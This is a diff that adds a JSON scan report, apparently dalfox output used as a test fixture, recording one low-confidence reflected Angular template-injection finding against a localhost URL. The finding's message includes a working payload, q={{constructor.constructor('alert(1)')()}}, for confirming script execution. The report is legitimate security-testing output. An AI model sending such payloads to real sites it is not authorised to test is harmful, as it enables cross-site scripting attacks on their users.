@@ -1,0 +1,72 @@
+{
+  "findings": [
+    {
+      "confidence": "low",
+      "confidence_reason": "framework template interpolation reflected into the compiled DOM region; client-side execution not browser-confirmed (no headless engine)",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:45545/?q=%7B%7Bdlx2b848ca5%7D%7D",
+      "detection_method": "reflection",
+      "evidence": "`{{dlx2b848ca5}}` interpolation survived with braces intact in the Angular compiled region",
+      "filter": {
+        "allowed": [
+          "$",
+          "(",
+          ")",
+          "+",
+          ",",
+          "-",
+          ".",
+          "/",
+          ":",
+          ";",
+          "=",
+          "[",
+          "\\",
+          "]",
+          "`",
+          "{",
+          "|",
+          "}"
+        ],
+        "blocked": [],
+        "encoded": [
+          "\"",
+          "'",
+          "<",
+          ">"
+        ]
+      },
+      "inject_type": "inHTML-CSTI",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "[CSTI] Angular client-side template injection in param q — the framework evaluates the reflected `{{…}}` interpolation in the browser even though the server HTML-escaped the markup. Confirm execution with: q={{constructor.constructor('alert(1)')()}}",
+      "method": "GET",
+      "param": "q",
+      "payload": "{{dlx2b848ca5}}",
+      "severity": "Low",
+      "type": "R",
+      "type_description": "Reflected - payload appears in the response, but its position was not confirmed exploitable; confirm manually"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.3.0",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 1,
+    "incomplete": false,
+    "scan_duration_ms": 305,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "method": "GET",
+        "status": "findings",
+        "target": "http://127.0.0.1:45545/?q=hello"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:45545/?q=hello"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 443
+  }
+}
